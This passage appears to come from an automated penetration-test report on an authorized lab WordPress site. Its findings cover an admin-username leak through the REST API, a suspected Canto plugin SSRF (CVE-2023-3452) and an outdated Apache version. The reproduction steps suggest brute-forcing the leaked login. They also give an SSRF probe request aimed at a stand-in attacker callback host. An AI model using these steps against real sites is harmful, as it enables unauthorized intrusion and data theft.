keep-alive: timeout=5, max=100
server: Apache/2.4.41 (Ubuntu)
vary: Accept-Encoding

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /wp-content/plugins/canto/includes/lib</title>
 </head>
 <body>
<h1>Index of /wp-content/plugins/canto/includes/lib</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/wp-content/plugins/canto/includes/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="class-canto-admin-api.php">class-canto-admin-api.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right"> 14K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="class-canto-attachment.php">class-canto-attachment.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right">1.5K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="class-canto-media.php">class-canto-media.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right">6.5K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="copy-media.php">copy-media.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right">9.3K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="detail.php">detail.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right">1.0K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="download.php">download.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right">1.3K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="get.php">get.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right">2.7K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="media-upload.php">media-upload.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right">3.2K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="sizes.php">sizes.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right">1.6K</td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/unknown.gif" alt="[   ]"></td><td><a href="tree.php">tree.php</a></td><td align="right">2024-06-18 00:45  </td><td align="right">1.3K</td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.41 (Ubuntu) Server at target.local Port 32812</address>
</body></html>
```

<a id="finding-10"></a>

### 10. [INFO] [info-disclosure] WP REST API posts endpoint leaks admin login username via _embed=author

- Screen: `s-0012`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32812/

An unauthenticated GET to /wp-json/wp/v2/posts?_embed=author causes the WP REST API to inline the full author object in each post's _embedded.author array. This includes the author's `slug` field which equals the WordPress login username. For post 53, the embedded author shows id=1, name="wordpress_admin", slug="wordpress_admin", disclosing the admin account login name. The baseline request (no _embed) returns only the numeric author ID. Draft and private post statuses are correctly blocked (401/403). This is a secondary exposure of the admin username beyond the already-confirmed /users endpoint leakage.

**Reproduction**

```
1. GET /index.php/wp-json/wp/v2/posts?_embed=author&per_page=1&_fields=id,author,_links,_embedded (unauthenticated).
2. In the JSON response, _embedded.author[0].slug = "wordpress_admin" — this is the admin login username.
3. This username can be used at /wp-login.php for credential stuffing or brute force.
```

**Evidence**

- Evidence `ev-mr0ttu2w-2n` — `artifacts/s-0012/ev-mr0ttu2w-2n/`

Request:

```http
GET /index.php/wp-json/wp/v2/posts HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
access-control-allow-headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
access-control-expose-headers: X-WP-Total, X-WP-TotalPages, Link
allow: GET
connection: Keep-Alive
content-length: 13191
content-type: application/json; charset=UTF-8
date: Tue, 30 Jun 2026 15:53:53 GMT
keep-alive: timeout=5, max=100
link: <http://target.local:32812/index.php/wp-json/>; rel="https://api.w.org/"
server: Apache/2.4.41 (Ubuntu)
vary: Origin
x-content-type-options: nosniff
x-robots-tag: noindex
x-wp-total: 3
x-wp-totalpages: 1

[{"id":53,"date":"2024-06-17T22:55:59","date_gmt":"2024-06-17T22:55:59","guid":{"rendered":"http:\/\/melodicmayhem.local\/?p=53"},"modified":"2024-06-17T22:57:06","modified_gmt":"2024-06-17T22:57:06","slug":"global-music-markets-exploring-the-k-pop-phenomenon","status":"publish","type":"post","link":"http:\/\/target.local:32812\/index.php\/2024\/06\/17\/global-music-markets-exploring-the-k-pop-phenomenon\/","title":{"rendered":"Global Music Markets: Exploring the K-pop Phenomenon"},"content":{"rendered":"\n<p class=\"wp-block-paragraph\">K-pop has transcended its regional roots to become a global powerhouse in the music industry, captivating audiences worldwide with its vibrant performances and catchy tunes.<\/p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>The Rise of K-pop:<\/strong> Originating from South Korea, K-pop has grown from a niche genre to a global phenomenon, led by bands like BTS and BLACKPINK. These artists have not only topped international music charts but have also played sold-out concerts across continents.<\/p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Cultural Impact:<\/strong> K-pop&#8217;s impact extends beyond music, influencing fashion, language, and social media trends around the world. Its unique blend of addictive melodies, dynamic choreography, and polished aesthetics has garnered a dedicated global fanbase.<\/p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>The Business of K-pop:<\/strong> The industry&#8217;s success is underpinned by a rigorous training system, where aspiring stars undergo years of intensive training in singing, dancing, and acting before debuting. This system has been critical in maintaining the high quality and consistency that fans have come to expect from K-pop acts.<\/p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Conclusion:<\/strong> K-pop&#8217;s rise to global prominence is not just a passing trend but a significant shift in the cultural landscape. Its ability to resonate with diverse audiences across the globe underscores the universal appeal of music and its power to connect people across cultural boundaries.<\/p>\n","protected":false},"excerpt":{"rendered":"<p>K-pop has transcended its regional roots to become a global powerhouse in the music industry, captivating audiences worldwide with its vibrant performances and catchy tunes. The Rise of K-pop: Originating from South Korea, K-pop has grown from a niche genre to a global phenomenon, led by bands like BTS and BLACKPINK. These artists have not [&hellip;]<\/p>\n","protected":false},"author":1,"featured_media":54,"comment_status":"closed","ping_status":"closed","sticky":false,"template":"","format":"standard","meta":{"footnotes":""},"categories":[1],"tags":[],"class_list":["post-53","post","type-post","status-publish","format-standard","has-post-thumbnail","hentry","category-uncategorized"],"_links":{"self":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts\/53","targetHints":{"allow":["GET"]}}],"collection":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/comments?post=53"}],"version-history":[{"count":2,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts\/53\/revisions"}],"predecessor-version":[{"id":56,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts\/53\/revisions\/56"}],"wp:featuredmedia":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/media\/54"}],"wp:attachment":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/media?parent=53"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/categories?post=53"},{"taxonomy":"post_tag","embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/tags?post=53"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}},{"id":50,"date":"2024-06-17T22:55:24","date_gmt":"2024-06-17T22:55:24","guid":{"rendered":"http:\/\/melodicmayhem.local\/?p=50"},"modified":"2024-06-18T15:19:52","modified_gmt":"2024-06-18T15:19:52","slug":"breaking-records-vinyl-sales-surge-to-highest-levels-since-1989","status":"publish","type":"post","link":"http:\/\/target.local:32812\/index.php\/2024\/06\/17\/breaking-records-vinyl-sales-surge-to-highest-levels-since-1989\/","title":{"rendered":"Breaking Records: Vinyl Sales Surge to Highest Levels Since 1989"},"content":{"rendered":"\n<p class=\"wp-block-paragraph\">In a digital age where streaming dominates, vinyl records have made an unexpected comeback, enchanting music lovers with their warm sound and tangible connection to music.<\/p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>The Stats:<\/strong> Recent reports reveal that vinyl sales have skyrocketed, surpassing digital downloads in revenue for the first time since the late &#8217;80s. Last year alone, over 27 million units were sold worldwide, marking a significant milestone in the vinyl revival.<\/p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Why Vinyl?<\/strong> The resurgence of vinyl is fueled by a combination of nostalgia and a new appreciation among younger audiences who crave a more authentic music experience. Vinyl offers a unique sound quality that many enthusiasts claim is superior to digital formats, providing a richer and more immersive listening experience.<\/p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Impact on the Music Industry:<\/strong> This vinyl renaissance is revitalizing record stores and independent labels, giving a financial boost to an industry that has struggled with the decline of physical sales. Artists are increasingly releasing special edition vinyl records, often including exclusive artwork and additional content to attract collectors.<\/p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Conclusion:<\/strong> The enduring appeal of vinyl records is a testament to the timeless nature of music. As vinyl continues to thrive, it reaffirms the importance of physical media in a predominantly digital landscape, offering a unique blend of the past and present.<\/p>\n","protected":false},"excerpt":{"rendered":"<p>In a digital age where streaming dominates, vinyl records have made an unexpected comeback, enchanting music lovers with their warm sound and tangible connection to music. The Stats: Recent reports reveal that vinyl sales have skyrocketed, surpassing digital downloads in revenue for the first time since the late &#8217;80s. Last year alone, over 27 million [&hellip;]<\/p>\n","protected":false},"author":1,"featured_media":51,"comment_status":"closed","ping_status":"closed","sticky":false,"template":"","format":"standard","meta":{"footnotes":""},"categories":[1],"tags":[],"class_list":["post-50","post","type-post","status-publish","format-standard","has-post-thumbnail","hentry","category-uncategorized"],"_links":{"self":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts\/50","targetHints":{"allow":["GET"]}}],"collection":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/comments?post=50"}],"version-history":[{"count":3,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts\/50\/revisions"}],"predecessor-version":[{"id":60,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts\/50\/revisions\/60"}],"wp:featuredmedia":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/media\/51"}],"wp:attachment":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/media?parent=50"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/categories?post=50"},{"taxonomy":"post_tag","embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/tags?post=50"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}},{"id":1,"date":"2024-06-17T21:55:15","date_gmt":"2024-06-17T21:55:15","guid":{"rendered":"http:\/\/melodicmayhem.local\/?p=1"},"modified":"2024-06-18T15:19:40","modified_gmt":"2024-06-18T15:19:40","slug":"hello-world","status":"publish","type":"post","link":"http:\/\/target.local:32812\/index.php\/2024\/06\/17\/hello-world\/","title":{"rendered":"The Rise of Virtual Concerts: A New Era in Live Music"},"content":{"rendered":"\n<p class=\"wp-block-paragraph\">As the world continues to navigate the challenges posed by global events like the COVID-19 pandemic, the music industry is rapidly adapting. Virtual concerts have become a vital part of this new normal, allowing artists and fans to connect in innovative ways.<\/p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>The Technology Behind Virtual Concerts:<\/strong>The magic of virtual concerts lies in the blend of traditional live performances with cutting-edge technology. Platforms like Twitch, YouTube Live, and custom VR stages allow artists to perform live from anywhere. These platforms are equipped with features that enable real-time interaction between artists and fans, creating an engaging experience that rivals in-person events.<\/p>\n\n\n\n<figure class=\"wp-block-image size-large is-resized\"><img decoding=\"async\" src=\"http:\/\/melodicmayhem.local\/wp-content\/themes\/rock-tune\/assets\/images\/explore-1.jpg\" alt=\"\" style=\"width:601px;height:auto\"\/><\/figure>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Notable Virtual Concerts:<\/strong> One of the landmark virtual events was the &#8220;Harmony &amp; Light&#8221; festival, which featured performances by global superstars like Elara Moon and DJ Vortex. The event drew in over 2 million viewers worldwide, showcasing the massive potential and reach of virtual live music.<\/p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Benefits and Challenges:<\/strong> Virtual concerts offer unparalleled accessibility, allowing fans from all corners of the globe to participate without the need for travel. However, they also present challenges such as ensuring stable internet connections and managing digital rights, which are crucial for preserving the quality and integrity of the performances.<\/p>\n\n\n\n<p class=\"wp-block-paragraph\"><strong>Conclusion:<\/strong> Virtual concerts are likely to remain a staple in the music industry, even as live events gradually resume. Their ability to bridge geographical divides and connect artists with a global audience is invaluable in our increasingly digital world.<\/p>\n","protected":false},"excerpt":{"rendered":"<p>As the world continues to navigate the challenges posed by global events like the COVID-19 pandemic, the music industry is rapidly adapting. Virtual concerts have become a vital part of this new normal, allowing artists and fans to connect in innovative ways. The Technology Behind Virtual Concerts:The magic of virtual concerts lies in the blend [&hellip;]<\/p>\n","protected":false},"author":1,"featured_media":47,"comment_status":"closed","ping_status":"closed","sticky":false,"template":"","format":"standard","meta":{"footnotes":""},"categories":[1],"tags":[],"class_list":["post-1","post","type-post","status-publish","format-standard","has-post-thumbnail","hentry","category-uncategorized"],"_links":{"self":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts\/1","targetHints":{"allow":["GET"]}}],"collection":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/comments?post=1"}],"version-history":[{"count":6,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts\/1\/revisions"}],"predecessor-version":[{"id":59,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts\/1\/revisions\/59"}],"wp:featuredmedia":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/media\/47"}],"wp:attachment":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/media?parent=1"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/categories?post=1"},{"taxonomy":"post_tag","embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/tags?post=1"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]}}]
```

- Evidence `ev-mr0ty9j0-31` — `artifacts/s-0012/ev-mr0ty9j0-31/`

Request:

```http
GET /index.php/wp-json/wp/v2/posts?_embed=author&per_page=1&_fields=id,author,_links,_embedded HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
access-control-allow-headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
access-control-expose-headers: X-WP-Total, X-WP-TotalPages, Link
allow: GET
connection: Keep-Alive
content-length: 1812
content-type: application/json; charset=UTF-8
date: Tue, 30 Jun 2026 15:57:20 GMT
keep-alive: timeout=5, max=100
link: <http://target.local:32812/index.php/wp-json/wp/v2/posts?_embed=author&per_page=1&_fields=id%2Cauthor%2C_links%2C_embedded&page=2>; rel="next"
server: Apache/2.4.41 (Ubuntu)
vary: Origin
x-content-type-options: nosniff
x-robots-tag: noindex
x-wp-total: 3
x-wp-totalpages: 3

[{"id":53,"author":1,"_links":{"self":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts\/53","targetHints":{"allow":["GET"]}}],"collection":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/comments?post=53"}],"version-history":[{"count":2,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts\/53\/revisions"}],"predecessor-version":[{"id":56,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts\/53\/revisions\/56"}],"wp:featuredmedia":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/media\/54"}],"wp:attachment":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/media?parent=53"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/categories?post=53"},{"taxonomy":"post_tag","embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/tags?post=53"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]},"_embedded":{"author":[{"id":1,"name":"wordpress_admin","url":"http:\/\/melodicmayhem.local","description":"","link":"http:\/\/target.local:32812\/index.php\/author\/wordpress_admin\/","slug":"wordpress_admin","_links":{"self":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/users\/1","targetHints":{"allow":["GET"]}}],"collection":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/users"}]}}]}}]
```

- Evidence `ev-mr0tyfdg-32` — `artifacts/s-0012/ev-mr0tyfdg-32/`

Request:

```http
GET /index.php/wp-json/wp/v2/posts?_embed=author&per_page=1&_fields=id,author,_links,_embedded HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
access-control-allow-headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
access-control-expose-headers: X-WP-Total, X-WP-TotalPages, Link
allow: GET
connection: Keep-Alive
content-length: 1812
content-type: application/json; charset=UTF-8
date: Tue, 30 Jun 2026 15:57:28 GMT
keep-alive: timeout=5, max=100
link: <http://target.local:32812/index.php/wp-json/wp/v2/posts?_embed=author&per_page=1&_fields=id%2Cauthor%2C_links%2C_embedded&page=2>; rel="next"
server: Apache/2.4.41 (Ubuntu)
vary: Origin
x-content-type-options: nosniff
x-robots-tag: noindex
x-wp-total: 3
x-wp-totalpages: 3

[{"id":53,"author":1,"_links":{"self":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts\/53","targetHints":{"allow":["GET"]}}],"collection":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts"}],"about":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/types\/post"}],"author":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/comments?post=53"}],"version-history":[{"count":2,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts\/53\/revisions"}],"predecessor-version":[{"id":56,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/posts\/53\/revisions\/56"}],"wp:featuredmedia":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/media\/54"}],"wp:attachment":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/media?parent=53"}],"wp:term":[{"taxonomy":"category","embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/categories?post=53"},{"taxonomy":"post_tag","embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/tags?post=53"}],"curies":[{"name":"wp","href":"https:\/\/api.w.org\/{rel}","templated":true}]},"_embedded":{"author":[{"id":1,"name":"wordpress_admin","url":"http:\/\/melodicmayhem.local","description":"","link":"http:\/\/target.local:32812\/index.php\/author\/wordpress_admin\/","slug":"wordpress_admin","_links":{"self":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/users\/1","targetHints":{"allow":["GET"]}}],"collection":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/users"}]}}]}}]
```

## Suspected (needs manual verification)

_Leads with one concrete observed anomaly but without control+2-replay confirmation. NOT counted in the confirmed total above — verify before relying on them._

<a id="finding-11"></a>

### 11. [SUSPECTED] [CRITICAL] [vulnerable-component] Canto WordPress Plugin 3.0.4 — CVE-2023-3452 Unauthenticated SSRF (Known Vulnerable Version)

- Screen: `s-0027`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32812/

**Anomaly (why this is a lead):** readme.txt publicly confirms Canto plugin v3.0.4 which is the exact version ceiling for CVE-2023-3452 (unauthenticated SSRF, CVSS 9.8); active OOB probes did not fire but containerized egress filtering is likely the cause, not absence of the vulnerable code path.

The Canto WordPress plugin version 3.0.4 is installed. This exact version is affected by CVE-2023-3452 (CVSS 9.8 Critical) — an unauthenticated Server-Side Request Forgery (SSRF) that allows any unauthenticated attacker to make the server issue arbitrary HTTP requests. This can be used for internal network scanning, credential theft via metadata endpoints (e.g. AWS IMDSv1), or chaining toward RCE. The plugin version is confirmed via the publicly-readable readme.txt. Active OOB SSRF probes (canto_preview_image, canto_process_request, canto_fetch actions) did not produce Collaborator callbacks — likely due to containerised egress filtering rather than the absence of the vulnerability — warranting manual verification with an accessible OOB host.

**Reproduction**

```
1. GET /wp-content/plugins/canto/readme.txt — response confirms "Stable tag: 3.0.4".\n2. Send unauthenticated POST to /wp-admin/admin-ajax.php with action=canto_preview_image&url=http://ATTACKER_OOB_HOST/ and observe DNS/HTTP callback from server.\n3. Alternatively confirm via CVE-2023-3452 PoC: the url parameter is passed to wp_remote_get() without sanitization, enabling full SSRF.
```

**Evidence**

- Evidence `ev-mr0upxto-5o` — `artifacts/s-0027/ev-mr0upxto-5o/`

Request:

```http
GET /wp-content/plugins/canto/readme.txt HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
accept-ranges: bytes
connection: Keep-Alive
content-length: 5606
content-type: text/plain
date: Tue, 30 Jun 2026 16:18:51 GMT
etag: "15e6-61b1f66afd740-gzip"
keep-alive: timeout=5, max=100
last-modified: Tue, 18 Jun 2024 00:45:41 GMT
server: Apache/2.4.41 (Ubuntu)
vary: Accept-Encoding

=== Canto ===
Contributors: Canto Inc, ianthekid, flightjim
Tags: digital asset management, brand management, cloud storage, DAM, file storage, image management, photo library, Canto
Requires at least: 5.0
Tested up to: 6.1
Stable tag: 3.0.4
License: GPLv2 or later
License URI: http://www.gnu.org/licenses/gpl-2.0.html

Easily find and publish your creative assets directly to wordpress without having to search through emails or folders, using digital asset management by Canto.

== Description ==

Simplify collaboration with your creative team by publishing photos, images, and other web-safe media from Canto directly to your WordPress website.
Instead of sending files back and forth, browse or search your Canto library directly in WordPress. You can search for text within file names, descriptions, comments, keywords, tags, or even the name of the person who uploaded the file to Canto.
Once you click to insert the image, it will save automatically to your WordPress Media Library.
Don’t have a Canto account? <a href="https://www.canto.com/signup/?utm_source=wordpress&utm_medium=plugin&utm_campaign=wordpress">Start a free trial</a> today!

== Installation ==

Installing Canto wordpress plugin can be done either by searching for "Canto" via the "Plugins > Add New" screen in your WordPress dashboard, or by using the following steps:

1. Download the plugin via WordPress.org
2. Upload the ZIP file through the 'Plugins > Add New > Upload' screen in your WordPress dashboard
3. Activate the plugin through the 'Plugins' menu in WordPress

Configure and authorize your account under "Settings > Canto" left nav menu. Click "Connect" and enter in your account credentials. You will be automatically redirected back to WordPress.

All set, enjoy!

== Screenshots ==

1. Find media assets quickly with Canto digital asset management
2. Insert into Post directly from our CDN
3. Inserts a native Gutenberg block with customizable options and formatting
4. Canto block under Common Blocks
5. Plugin settings include duplicate checking and automatic updates for assets imported in WordPress

== Frequently Asked Questions ==

= Canto Help =

For help installing or using the plugin, refer to <a href="https://cantodam.freshdesk.com/">Canto Help</a>

= Can I use this plugin without a Canto account? =

Unfortunately not. However, you are welcome to sign up today for free! <a href="https://www.canto.com/signup/?utm_source=wordpress&utm_medium=plugin&utm_campaign=wordpress">Start free trial</a>

= How do I authorize my account? =

We recommend you to connect to your Canto account using an administrator account.

== Changelog ==
= 3.0.4 =
* 2023-1-11
* Bug fixes and improvements

= 3.0.3 =
* 2023-1-3
* Bug fixes and improvements

= 3.0.2 =
* 2022-12-29
* Bug fixes and improvements

= 3.0.1 =
* 2022-12-20
* Bug fixes and improvements

= 3.0.0 =
* 2022-11-17
* This version of the plugin supports Wordpress v6.

= 2.1.2 =
* 2022-9-26
* Minor bug fixes

= 2.1.1.1 =
* 2022-5-13
* Minor bug fixes

= 2.1.1 =
* 2022-2-23
* Minor bug fixes

= 2.0.10 =
* 2022-1-26
* Minor bug fixes

= 2.0.9 =
* 2021-10-27
* Minor bug fixes
* Performance improvements

= 2.0.8 =
* 2021-09-20
* FIX: Modified some styles that may conflict with other plugins.
* FIX: Fixed the problem that the domain name cannot be selected after the login fails.
* FIX: Improved performance.

= 2.0.7 =
* 2021-08-03
* FIX: The album is not loaded when clicked.

= 2.0.6 =
* 2021-05-27
* FIX: WordPress plugin not working on Safari and Firefox.
* FIX: Other problems.

= 2.0.5 =
* 2021-05-19
* FIX: The problem of not being able to log off.

= 2.0.4 =
* 2021-05-17
* FIX: Fixed some security issues.
* FIX: The problem cannot insert picture without modification date.

= 2.0.3 =
* 2021-04-28
* FIX: Fixed the style conflict issue that caused the button to fail.
* FIX: Fixed the problem that pictures cannot be inserted normally.
* FIX: Fixed some security issues.
* FIX: Other problems.

= 2.0.2 =
* 2021-02-07
* FIX: Fixed the issue about login.

= 2.0.1 =
* 2021-01-30
* FIX: Fixed the secrity issue for the full review.

= 2.0.0 =
* 2021-01-30
* FIX: Fixed all secrity issue for the full review.


= 1.9.0 =
* 2020-12-14
* FIX: Fixed secrity issue for the full review.

= 1.8.0 =
* 2020-11-26
* FIX: Fixed issue about cannot login within .global.

= 1.7.0 =
* 2020-11-17
* FIX: Fixed issue about cannot insert image in Firefox.

= 1.6.0 =
* 2020-9-29
* FIX: Fixed issue about token expired.

= 1.5.0 =
* 2020-8-20
* FIX: Fixed issue of treeview for global env.

= 1.4.0 =
* 2019-10-10
* FIX: The tree structure data is too large to be rendered. Now load the first layer for the first time.

= 1.3.0 =
* 2019-03-06
* NEW: Gutenberg block compatibility. Canto block created to import assets into Gutenberg with native block types based on file type

= 1.2.1 =
* 2018-11-07
* FIX: Edge browser compatibility for CSS and JS loading issues

= 1.2.0 =
* 2018-10-01
* FIX: Added API domain selection for legacy and canto.global accounts
* FIX: Divi theme compatibility for custom image sizes

= 1.1.0 =
* 2018-06-09
* NEW: Added icon for non-image files. File name appears when hovering over item

= 1.0.0 =
* 2018-06-08
* Merging formerly known as "Flight by Canto" as a Canto Wordpress plugin

== Upgrade Notice ==

= 1.4.0 =
* 2019-10-10
* FIX: The tree structure data is too large to be rendered. Now load the first layer for the first time.
```

<a id="finding-12"></a>

### 12. [SUSPECTED] [HIGH] [vulnerable-component] Outdated Apache httpd 2.4.41 — CVE-2021-40438 mod_proxy SSRF / CVE-2023-25690 request smuggling

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32812/

**Anomaly (why this is a lead):** Apache httpd 2.4.41 (Ubuntu) detected via the Server response header on the site root (server: Apache/2.4.41 (Ubuntu)). 2.4.41 is a 2019 build, ~14 minor releases behind. It is in the affected range for multiple High/Critical CVEs: CVE-2021-40438 (mod_proxy SSRF, CVSS 9.0 — forward to attacker-chosen origin via crafted URI), CVE-2023-25690 (mod_proxy HTTP request smuggling, CVSS 9.8), and CVE-2022-22720 (HTTP request smuggling, CVSS 9.8). Several require specific modules (mod_proxy) enabled. Version-based, not yet exploited.

